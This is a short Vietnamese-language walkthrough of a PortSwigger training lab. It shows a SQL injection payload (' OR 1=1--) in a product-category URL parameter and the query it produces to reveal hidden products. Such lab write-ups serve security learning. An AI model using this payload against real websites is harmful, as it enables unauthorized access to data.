# Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

**Lab URL:** [PortSwigger Lab](https://portswigger.net/web-security/lab-retrieve-hidden-data)

## Mô tả

Bài lab này yêu cầu ta thực hiện SQLi để show tất cả các sản phẩm ra trong khi hiển thị một category bất kỳ.

## Khai thác

`Payload của mình: "https://ac5b1feb1e123a53c0fc5396006d00c3.web-security-academy.net/filter?category=Clothing%2c+shoes+and+accessories%27+OR+1=1--"`

Có thể hiểu rằng, server sẽ query câu lệnh kiểu: 

```sql
SELECT * FROM products WHERE category = 'Clothing%2c+shoes+and+accessories' OR 1=1--
```

Sau "--" thì tất cả sẽ bị comment lại và không thể thực thi. Kết quả với câu query:

![Solved retriving hidden data](./basic-attack/solved-retriving-data.jpg)
